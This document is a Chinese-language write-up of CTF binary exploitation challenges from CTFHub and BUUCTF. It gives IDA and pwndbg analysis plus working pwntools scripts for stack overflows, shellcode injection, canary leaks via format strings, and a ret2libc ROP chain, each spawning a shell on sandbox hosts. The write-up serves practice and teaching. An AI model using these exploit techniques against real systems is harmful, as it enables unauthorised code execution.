# Pwn

## CTFHub

### ret2text

先`file ./ret2text`查看文件类型再`checksec --file=./ret2text`检查一下文件保护情况。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/1.png)

用`IDA Pro 64bit`打开附件`ret2text`，按`F5`反汇编源码并查看主函数，发现`gets()`函数读取输入到变量`v4`中，`v4`的长度只有`0x70`，即可用栈大小只有`112`字节，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/2.png)

双击`v4`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x70`个字节占满`s`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/3.png)

在`Function Window`中注意到有一个名为`secure()`的函数，函数中当`scanf()`输入的`v2`变量和`rand()`函数生成的`v3`变量值相等时，会发生系统调用，因此构造`payload`时需要再加上`system('/bin/sh')`函数的地址即可。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/4.png)

编写`Python`代码即可得到`ctfhub{f878895b3600b2e2192e5c9a}`。

```python
from pwn import *

io = remote('challenge-e20ddfc12b209019.sandbox.ctfhub.com', 34749)
payload = b'a'*0x70 + b'fuckpwn!' + p64(0x4007B8)
io.sendlineafter('Welcome to CTFHub ret2text.Input someting:\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/5.png)

提交`ctfhub{f878895b3600b2e2192e5c9a}`即可。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/6.png)

------

### ret2shellcode

先`file ./ret2shellcode`查看文件类型再`checksec --file=./ret2shellcode`检查一下文件保护情况。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/1.png)

用`IDA Pro 64bit`打开附件`ret2shellcode`，按`F5`反汇编源码并查看主函数，发现`buf`变量的地址被`printf()`函数输出了，然后`read()`函数读取输入到变量`buf`中，`char`型变量`buf`的长度只有`0x10`，即可用栈大小只有`10`字节，但是`read()`函数限制输入`0x400`个字节，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/2.png)

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x10`个字节占满`s`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/3.png)

由于`checksec`时发现`NX disabled`，即程序没有开`NX`保护，栈的数据段可以执行。虽然程序中并没有`system()`函数和`/bin/sh`，但是`buf`变量的栈地址被`printf()`函数泄露出来了，因此可以尝试让程序跳转到我们构造的`shellcode`中，并在栈溢出后返回到栈的数据段上执行，就能得到`shell`权限了。

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# io = process('ret2shellcode')
io = remote('challenge-90f37d9c89a2800a.sandbox.ctfhub.com', 33884)
io.recvuntil(b'[')
buf_address = int(io.recvuntil(b']')[:-1].decode('utf-8'), 16)
log.success('buf_address => %s' % hex(buf_address).upper())
shellcode_address = buf_address+0x20 # buf与rbp的距离0x10 + rbp的宽度0x8 + 返回地址的长度0x8
log.success('buf_address => %s' % hex(shellcode_address).upper())
shellcode = asm(shellcraft.sh())
payload = b'a'*0x10 + b'fuckpwn!' + p64(shellcode_address) + shellcode
io.recv()
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/4.png)

`ls`可以看到有个`flag`文件，`cat flag`拿到`ctfhub{f878895b3600b2e2192e5c9a}`提交即可。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/5.png)

------

### leak canary

先`file ./pwn`查看文件类型再`checksec --file=./pwn`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfhub/leak canary]
└─$ file ./pwn
./pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4ee12047b4e43af214307fb515bc2ee20ed317aa, not stripped
                                                                                                      
┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfhub/leak canary]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/ctfhub/leak canary/pwn'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(&argc);
  puts("Welcome to CTFHub leak canary.Input someting:");
  vuln();
  return 0;
}
```

双击`vuln()`函数查看详情，`read()`函数读取输入到变量`buf`中，`char`型变量`buf`的长度只有`100`字节，而`read()`函数限制输入`0x200`个字节，显然存在栈溢出漏洞。此外，`buf`变量的地址被`printf()`函数输出啦，存在格式化字符串漏洞。

```c
unsigned int vuln()
{
  int i; // [esp+4h] [ebp-74h]
  char buf[100]; // [esp+8h] [ebp-70h] BYREF
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  for ( i = 0; i <= 1; ++i )
  {
    read(0, buf, 0x200u);
    printf(buf);
  }
  return __readgsdword(0x14u) ^ v3;
}
```

此外我们还发现了`shell()`函数直接调用`system("/bin/sh")`。

```c
int shell()
{
  return system("/bin/sh");
}
```

程序的逻辑很简单，进行两次输入输出。第一次输入时，我们可以利用格式化字符串漏洞拿到`canary`的值，第二次输入时，我们可以利用栈溢出漏洞，填充足够的`padding`并保证`canary`的值不被覆盖，最后劫持程序执行`shell()`。用`pwndbg`来进一步分析程序。

```assembly
┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfhub/leak canary]
└─$ gdb ./pwn
pwndbg> disass main
Dump of assembler code for function main:
   0x08048697 <+0>:     lea    ecx,[esp+0x4]
   0x0804869b <+4>:     and    esp,0xfffffff0
   0x0804869e <+7>:     push   DWORD PTR [ecx-0x4]
   0x080486a1 <+10>:    push   ebp
   0x080486a2 <+11>:    mov    ebp,esp
   0x080486a4 <+13>:    push   ebx
   0x080486a5 <+14>:    push   ecx
   0x080486a6 <+15>:    call   0x80484e0 <__x86.get_pc_thunk.bx>
   0x080486ab <+20>:    add    ebx,0x1955
   0x080486b1 <+26>:    call   0x80485d1 <init>
   0x080486b6 <+31>:    sub    esp,0xc
   0x080486b9 <+34>:    lea    eax,[ebx-0x1878]
   0x080486bf <+40>:    push   eax
   0x080486c0 <+41>:    call   0x8048450 <puts@plt>
   0x080486c5 <+46>:    add    esp,0x10
   0x080486c8 <+49>:    call   0x804862b <vuln>
   0x080486cd <+54>:    mov    eax,0x0
   0x080486d2 <+59>:    lea    esp,[ebp-0x8]
   0x080486d5 <+62>:    pop    ecx
   0x080486d6 <+63>:    pop    ebx
   0x080486d7 <+64>:    pop    ebp
   0x080486d8 <+65>:    lea    esp,[ecx-0x4]
   0x080486db <+68>:    ret    
End of assembler dump.
pwndbg> disassemble vuln
Dump of assembler code for function vuln:
   0x0804862b <+0>:     push   ebp
   0x0804862c <+1>:     mov    ebp,esp
   0x0804862e <+3>:     push   ebx
   0x0804862f <+4>:     sub    esp,0x74
   0x08048632 <+7>:     call   0x80484e0 <__x86.get_pc_thunk.bx>
   0x08048637 <+12>:    add    ebx,0x19c9
   0x0804863d <+18>:    mov    eax,gs:0x14
   0x08048643 <+24>:    mov    DWORD PTR [ebp-0xc],eax
   0x08048646 <+27>:    xor    eax,eax
   0x08048648 <+29>:    mov    DWORD PTR [ebp-0x74],0x0
   0x0804864f <+36>:    jmp    0x804867a <vuln+79>
   0x08048651 <+38>:    sub    esp,0x4
   0x08048654 <+41>:    push   0x200
   0x08048659 <+46>:    lea    eax,[ebp-0x70]
   0x0804865c <+49>:    push   eax
   0x0804865d <+50>:    push   0x0
   0x0804865f <+52>:    call   0x8048420 <read@plt>
   0x08048664 <+57>:    add    esp,0x10
   0x08048667 <+60>:    sub    esp,0xc
   0x0804866a <+63>:    lea    eax,[ebp-0x70]
   0x0804866d <+66>:    push   eax
   0x0804866e <+67>:    call   0x8048430 <printf@plt>
   0x08048673 <+72>:    add    esp,0x10
   0x08048676 <+75>:    add    DWORD PTR [ebp-0x74],0x1
   0x0804867a <+79>:    cmp    DWORD PTR [ebp-0x74],0x1
   0x0804867e <+83>:    jle    0x8048651 <vuln+38>
   0x08048680 <+85>:    nop
   0x08048681 <+86>:    mov    eax,DWORD PTR [ebp-0xc]
   0x08048684 <+89>:    xor    eax,DWORD PTR gs:0x14
   0x0804868b <+96>:    je     0x8048692 <vuln+103>
   0x0804868d <+98>:    call   0x8048750 <__stack_chk_fail_local>
   0x08048692 <+103>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08048695 <+106>:   leave  
   0x08048696 <+107>:   ret    
End of assembler dump.
pwndbg> b *vuln+52
Breakpoint 1 at 0x804865f
pwndbg> run
Starting program: /home/tyd/ctf/pwn/ctfhub/leak canary/pwn 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to CTFHub leak canary.Input someting:

Breakpoint 1, 0x0804865f in vuln ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────
 EAX  0xffffcf38 ◂— 0x1
 EBX  0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f08 (_DYNAMIC) ◂— 0x1
 ECX  0xf7e1e9b8 (_IO_stdfile_1_lock) ◂— 0x0
 EDX  0x1
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
 ESI  0x80486e0 (__libc_csu_init) ◂— push   ebp
 EBP  0xffffcfa8 —▸ 0xffffcfb8 ◂— 0x0
 ESP  0xffffcf20 ◂— 0x0
 EIP  0x804865f (vuln+52) —▸ 0xfffdbce8 ◂— 0xfffdbce8
──────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
 ► 0x804865f <vuln+52>    call   read@plt                     <read@plt>
        fd: 0x0 (/dev/pts/8)
        buf: 0xffffcf38 ◂— 0x1
        nbytes: 0x200
 
   0x8048664 <vuln+57>    add    esp, 0x10
   0x8048667 <vuln+60>    sub    esp, 0xc
   0x804866a <vuln+63>    lea    eax, [ebp - 0x70]
   0x804866d <vuln+66>    push   eax
   0x804866e <vuln+67>    call   printf@plt                     <printf@plt>
 
   0x8048673 <vuln+72>    add    esp, 0x10
   0x8048676 <vuln+75>    add    dword ptr [ebp - 0x74], 1
   0x804867a <vuln+79>    cmp    dword ptr [ebp - 0x74], 1
   0x804867e <vuln+83>    jle    vuln+38                     <vuln+38>
 
   0x8048680 <vuln+85>    nop    
──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ esp 0xffffcf20 ◂— 0x0
01:0004│     0xffffcf24 —▸ 0xffffcf38 ◂— 0x1
02:0008│     0xffffcf28 ◂— 0x200
03:000c│     0xffffcf2c —▸ 0x8048637 (vuln+12) ◂— add    ebx, 0x19c9
04:0010│     0xffffcf30 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0014│     0xffffcf34 ◂— 0x0
06:0018│ eax 0xffffcf38 ◂— 0x1
07:001c│     0xffffcf3c —▸ 0x804829c ◂— add    byte ptr [ecx + ebp*2 + 0x62], ch
────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
 ► f 0 0x804865f vuln+52
   f 1 0x80486cd main+54
   f 2 0xf7c23295 __libc_start_call_main+117
   f 3 0xf7c23358 __libc_start_main+136
   f 4 0x80484c2 _start+50
──────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> n
AAAA
0x08048664 in vuln ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────
*EAX  0x5
 EBX  0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f08 (_DYNAMIC) ◂— 0x1
*ECX  0xffffcf38 ◂— 0x41414141 ('AAAA')
*EDX  0x200
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
 ESI  0x80486e0 (__libc_csu_init) ◂— push   ebp
 EBP  0xffffcfa8 —▸ 0xffffcfb8 ◂— 0x0
 ESP  0xffffcf20 ◂— 0x0
*EIP  0x8048664 (vuln+57) ◂— add    esp, 0x10
──────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
   0x804865f <vuln+52>    call   read@plt                     <read@plt>
 
 ► 0x8048664 <vuln+57>    add    esp, 0x10
   0x8048667 <vuln+60>    sub    esp, 0xc
   0x804866a <vuln+63>    lea    eax, [ebp - 0x70]
   0x804866d <vuln+66>    push   eax
   0x804866e <vuln+67>    call   printf@plt                     <printf@plt>
 
   0x8048673 <vuln+72>    add    esp, 0x10
   0x8048676 <vuln+75>    add    dword ptr [ebp - 0x74], 1
   0x804867a <vuln+79>    cmp    dword ptr [ebp - 0x74], 1
   0x804867e <vuln+83>    jle    vuln+38                     <vuln+38>
 
   0x8048680 <vuln+85>    nop    
──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ esp 0xffffcf20 ◂— 0x0
01:0004│     0xffffcf24 —▸ 0xffffcf38 ◂— 0x41414141 ('AAAA')
02:0008│     0xffffcf28 ◂— 0x200
03:000c│     0xffffcf2c —▸ 0x8048637 (vuln+12) ◂— add    ebx, 0x19c9
04:0010│     0xffffcf30 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0014│     0xffffcf34 ◂— 0x0
06:0018│ ecx 0xffffcf38 ◂— 0x41414141 ('AAAA')
07:001c│     0xffffcf3c —▸ 0x804820a ◂— add    byte ptr [eax], al
────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
 ► f 0 0x8048664 vuln+57
   f 1 0x80486cd main+54
   f 2 0xf7c23295 __libc_start_call_main+117
   f 3 0xf7c23358 __libc_start_main+136
   f 4 0x80484c2 _start+50
──────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> stack 0x25
00:0000│ esp 0xffffcf20 ◂— 0x0
01:0004│     0xffffcf24 —▸ 0xffffcf38 ◂— 0x41414141 ('AAAA')  # 输入的起始地址
02:0008│     0xffffcf28 ◂— 0x200
03:000c│     0xffffcf2c —▸ 0x8048637 (vuln+12) ◂— add    ebx, 0x19c9
04:0010│     0xffffcf30 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0014│     0xffffcf34 ◂— 0x0
06:0018│ ecx 0xffffcf38 ◂— 0x41414141 ('AAAA')
07:001c│     0xffffcf3c —▸ 0x804820a ◂— add    byte ptr [eax], al
08:0020│     0xffffcf40 —▸ 0x804a00c (setbuf@got[plt]) —▸ 0xf7c7b7b0 (setbuf) ◂— sub    esp, 0x10
09:0024│     0xffffcf44 ◂— 0x20 /* ' ' */
0a:0028│     0xffffcf48 —▸ 0xf7c80af9 (__overflow+9) ◂— add    ebx, 0x19c4fb
0b:002c│     0xffffcf4c —▸ 0xf7e1ba40 (_IO_file_jumps) ◂— 0x0
0c:0030│     0xffffcf50 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
0d:0034│     0xffffcf54 —▸ 0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
0e:0038│     0xffffcf58 —▸ 0xffffcf98 —▸ 0xffffcfb8 ◂— 0x0
0f:003c│     0xffffcf5c —▸ 0xf7c74f3b (puts+395) ◂— add    esp, 0x10
10:0040│     0xffffcf60 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
11:0044│     0xffffcf64 ◂— 0xa /* '\n' */
12:0048│     0xffffcf68 ◂— 0x2d /* '-' */
13:004c│     0xffffcf6c —▸ 0xf7c7b7c5 (setbuf+21) ◂— add    esp, 0x1c
14:0050│     0xffffcf70 —▸ 0xf7e1dd00 (_IO_2_1_stderr_) ◂— 0xfbad2087
15:0054│     0xffffcf74 ◂— 0x7d4
16:0058│     0xffffcf78 —▸ 0xf7e1de3c (stdout) —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
17:005c│     0xffffcf7c ◂— 0x2d /* '-' */
18:0060│     0xffffcf80 —▸ 0xffffcfb8 ◂— 0x0
19:0064│     0xffffcf84 —▸ 0xf7fdb8d0 (_dl_runtime_resolve+16) ◂— pop    edx
1a:0068│     0xffffcf88 —▸ 0xf7e1e9ac (_IO_stdfile_2_lock) ◂— 0x0
1b:006c│     0xffffcf8c —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f08 (_DYNAMIC) ◂— 0x1
1c:0070│     0xffffcf90 —▸ 0x80486e0 (__libc_csu_init) ◂— push   ebp
1d:0074│     0xffffcf94 —▸ 0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
1e:0078│     0xffffcf98 —▸ 0xffffcfb8 ◂— 0x0
1f:007c│     0xffffcf9c ◂— 0xe33c6800    # canary在这 $ebp-0xc
20:0080│     0xffffcfa0 —▸ 0x8048788 ◂— push   edi /* 'Welcome to CTFHub leak canary.Input someting:' */
21:0084│     0xffffcfa4 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f08 (_DYNAMIC) ◂— 0x1
22:0088│ ebp 0xffffcfa8 —▸ 0xffffcfb8 ◂— 0x0
23:008c│     0xffffcfac —▸ 0x80486cd (main+54) ◂— mov    eax, 0
24:0090│     0xffffcfb0 —▸ 0xffffcfd0 ◂— 0x1
pwndbg> x/1x $ebp-0xc
0xffffcf9c:     0xe33c6800
pwndbg> x/32x $esp
0xffffcf20:     0x00000000      0xffffcf38      0x00000200      0x08048637
0xffffcf30:     0xf7e1dda0      0x00000000      0x41414141      0x0804820a
0xffffcf40:     0x0804a00c      0x00000020      0xf7c80af9      0xf7e1ba40
0xffffcf50:     0xf7e1dda0      0xf7e1cff4      0xffffcf98      0xf7c74f3b
0xffffcf60:     0xf7e1dda0      0x0000000a      0x0000002d      0xf7c7b7c5
0xffffcf70:     0xf7e1dd00      0x000007d4      0xf7e1de3c      0x0000002d
0xffffcf80:     0xffffcfb8      0xf7fdb8d0      0xf7e1e9ac      0x0804a000
0xffffcf90:     0x080486e0      0xf7ffcb80      0xffffcfb8      0xe33c6800  # 从0开始数,canary是第31个 
```

`canary`到栈顶`$esp`的偏移量是`0x1f`即`31`，因此我们可以用`%31$x`来以16进制格式输出无`0x`开头的字符串，拿到`canary`后将其转换为`int`型数值，接着利用栈溢出漏洞。

构造`payload`时，先用`cyclic()`填充`100`个字节的`padding`（`pwndbg`中可以算出`0xffffcf9c-0xffffcf38=100`，`IDA Pro`查看栈结构覆盖到`canary`正好是`0x70-0xc=100`），写入读取到的`canary`数值，并继续填充`0xc`个`padding`覆盖到栈帧`$ebp`，接着写入我们想要跳转的`shell()`函数所在地址。编写`Python`代码求解，拿到`shell`后输入`cat flag`得到`ctfhub{ffa27275c0ee969520de8e2b}`。

```python
from pwn import *

io = remote('challenge-00924c33bef2cbdc.sandbox.ctfhub.com', 34949)
io.recvline()
io.sendline(b'%31$x')
canary = int(io.recv(8), 16)
log.success('canary => %#x', canary)
elf = ELF('./pwn')
shell_addr = elf.symbols['shell']  # 0x80485a6
payload = cyclic(0x70-0xc) + p32(canary) + cyclic(0xc) + p32(shell_addr)
io.sendline(payload)
io.interactive()
```

------

### ROP

先`file ./pwn`查看文件类型再`checksec --file=./pwn`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfhub/ROP]
└─$ file ./pwn
./pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f5d131f24a3b86fc859f2cfade17eb92888ff738, not stripped
                                                                                                      
┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfhub/ROP]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/ctfhub/ROP/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rdi

  puts("Welcome to CTFHub rop.Input someting:\n");
  v3 = _bss_start;
  fflush(_bss_start);
  vulnerable_function(v3);
  return 0;
}
```

双击`vulnerable_function()`函数查看详情，`read()`函数读取输入到变量`buf`中，`char`型变量`buf`的长度只有`64`字节，而`read()`函数限制输入`0x200`个字节，显然存在栈溢出漏洞。构造`payload`时可以先用`0x40`个字节占满`buf`变量，再用`0x8`个字节覆盖到`$rbp`。

```c
ssize_t vulnerable_function()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  return read(0, buf, 0x200uLL);
}
```

此外，该程序没有发现直接调用`system("/bin/sh")`的后门函数。`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9`，剩下的参数从右往左依次入栈。该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi; ret`的地址为`0x400683`，`ret`的地址是`0x40048e`。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfhub/ROP]
└─$ ROPgadget --binary ./pwn --only "pop|ret"
Gadgets information
============================================================
0x000000000040067c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040067e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400680 : pop r14 ; pop r15 ; ret
0x0000000000400682 : pop r15 ; ret
0x000000000040067b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040067f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400538 : pop rbp ; ret
0x0000000000400683 : pop rdi ; ret
0x0000000000400681 : pop rsi ; pop r15 ; ret
0x000000000040067d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040048e : ret

Unique gadgets found: 11
```

该程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并利用`puts()`函数泄露`puts()`函数在`got`表中的真实地址，利用题目给出的`libc-2.27.so`可以算出`libc`的基地址，进而求得`system()`和`/bin/sh`的地址。如果题目没有给出`libc`文件，我们可以使用`LibcSearcher`尝试求解`libc`基地址，选用的`Libc`为`libc6_2.27-0ubuntu3_amd64`，进而求得`system()`和`/bin/sh`的地址，构造`ROP`链执行`system('/bin/sh')`成功，`cat flag`得到`ctfhub{886c5a56d6e9660ecc25656d}`，提交即可。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('challenge-aa7fdc153a68545a.sandbox.ctfhub.com', 32528)
elf = ELF('./pwn')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']
pop_rdi = 0x400683   # pop rdi; ret
padding = cyclic(0x40+0x8)
payload = padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.recvline()
io.sendline(payload)
io.recvline()
puts_addr = u64(io.recvline()[:-1].ljust(8, b'\x00'))
log.success('puts_addr => %#x', puts_addr)
ret = 0x40048e  # ret
libc = ELF('./libc-2.27.so')
offset = {'puts': libc.sym['puts'], 'system': libc.sym['system'], 'sh': next(libc.search(b'/bin/sh'))}
# from LibcSearcher import *
# libc = LibcSearcher('puts', puts_addr)
# offset = {'puts': libc.dump('puts'), 'system': libc.dump('system'), 'sh': libc.dump('str_bin_sh')}
# Choose: libc6_2.27-0ubuntu3_amd64
libcbase = puts_addr - offset['puts']
log.success('libcbase_addr => %#x', libcbase)
system_addr = libcbase + offset['system']
log.success('system_addr => %#x', system_addr)
bin_sh_addr = libcbase + offset['sh']
log.success('bin_sh_addr => %#x', bin_sh_addr)
shellcode = padding + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
io.sendlineafter(b'\n', shellcode)
io.interactive()
```

------

## BUUCTF

### [test_your_nc](https://buuoj.cn/challenges#test_your_nc)

这题亏我还先`file ./test`查看文件类型再`checksec --file=test`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/test_your_nc/1.png)

结果输入以下代码就能拿到`flag{24c4fb91-44b7-4a4f-8f30-895875efacd7}`。

```bash
nc node4.buuoj.cn 27841 #使用nc连接node4.buuoj.cn的监听端口27841
ls #这步可以看到当前目录下有个flag文件
cat flag #直接输出flag即可
```

------

### [others_shellcode](https://buuoj.cn/challenges#others_shellcode)

先`file ./other_shellcode`查看文件类型再`checksec --file=./other_shellcode`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/others_shellcode/1.png)

在本地尝试运行一下这个程序，好家伙发现这直接执行了`shell`，尝试输入`cat flag`就拿到本地生成的`flag`啦。

![](https://paper.tanyaodan.com/BUUCTF/others_shellcode/2.png)

用`IDA Pro 32bit`打开附件`shell_asm`后按`F5`反汇编源码并查看主函数，发现有个`getShell()`函数很可疑。

![](https://paper.tanyaodan.com/BUUCTF/others_shellcode/3.png)

双击`getShell()`函数查看详情，发现程序将字符串`/bin//sh`赋值给了`char`型数组`v1`，并把`int`型变量`result`赋值为`11`，但是这都不是重点，重点是`__asm {int 80h}`这行代码，它在`C`语言里嵌入了汇编语言，并且用`int 80h`进行系统调用`shell`。

![](https://paper.tanyaodan.com/BUUCTF/others_shellcode/4.png)

编写`Python`代码连接`node4.buuoj.cn`的监听端口`28021`，发送`cat flag`即可得到`flag{12aab39b-9d20-4f50-a9a8-b52320ed3771}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 28021)
io.sendline(b'cat flag')
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/others_shellcode/5.png)

------

### [rip](https://buuoj.cn/challenges#rip)

先`file ./pwn1`查看文件类型再`checksec --file=pwn1`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/rip/1.png)

用`IDA Pro 64bit`打开`pwn1`后按`F5`反汇编源码并查看主函数，发现`gets()`函数读取输入到变量`s`中，`s`的长度只有`0xf`，即可用栈大小只有`15`字节，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/rip/2.png)

在`Functions window`可以看到有一个`fun()`函数：

![](https://paper.tanyaodan.com/BUUCTF/rip/3.png)

按`F5`反汇编可以看到这是一个系统调用，且`fun()`函数的起始地址为`0x401186`。

![](https://paper.tanyaodan.com/BUUCTF/rip/4.png)

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`28531`，并发送`payload`：

```python
from pwn import *
# remote()建立远程连接,指明ip和port
io = remote('node4.buuoj.cn', 28531)
payload = b'a'*(0xf + 0x8) + p64(0x40118A)
io.sendline(payload) #发送数据
io.interactive() #与shell进行交互
```

与`shell`交互时输入以下命令行即可得到`flag{c706d420-68bf-4b75-9468-97997d4817b6}`。

```bash
ls #这步可以看到当前目录下有个flag文件
cat flag #直接输出flag即可
```

![](https://paper.tanyaodan.com/BUUCTF/rip/5.png)

------

### [warmup_csaw_2016](https://buuoj.cn/challenges#warmup_csaw_2016)

先`file ./warmup_csaw_2016`查看文件类型再`checksec --file=warmup_csaw_2016`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/1.png)

用`IDA Pro 64bit`打开`warmup_csaw_2016`后按`F5`反汇编源码并查看主函数，发现`gets()`函数读取输入到变量`v5`中，`v5`的长度只有`0x40`，即可用栈大小只有`64`字节，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/2.png)

在`Functions window`可以看到有一个`sub_40060D()`函数，按`F5`反汇编可以看到这是一个系统调用，且`sub_40060D()`函数的起始地址为`0x40060D`。

![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/3.png)

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`25282`，发送`payload`即可得到`flag{31eb59d1-1c21-4440-96a5-b12276f75a41}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 25282)
payload = b'a'*(0x40 + 0x8) + p64(0x40060D)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/4.png)

------

### [ciscn_2019_n_1](https://buuoj.cn/challenges#ciscn_2019_n_1)

先`file ./ciscn_2019_n_1`查看文件类型再`checksec --file=ciscn_2019_n_1`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/1.png)

用`IDA Pro 64bit`打开`ciscn_2019_n_1`后按`F5`反汇编源码并查看主函数，发现`fun()`函数最可疑。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/2.png)

双击`func()`函数查看源码可以看到当`v2 = 11.28125`时会有一个系统调用。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/3.png)

查看汇编代码双击`cs:dword_4007F4`可以看到`11.28125`在内存中的`16`进制表示为`0x41348000`。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/4.png)

查看栈结构，此处`var_30`是`v1`，而`var_4`是`v2`，需要`(0x30-0x04)=44`个字节就能让栈溢出，最后再填入`11.28125`对应的十六进制数`0x41348000`。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/5.png)

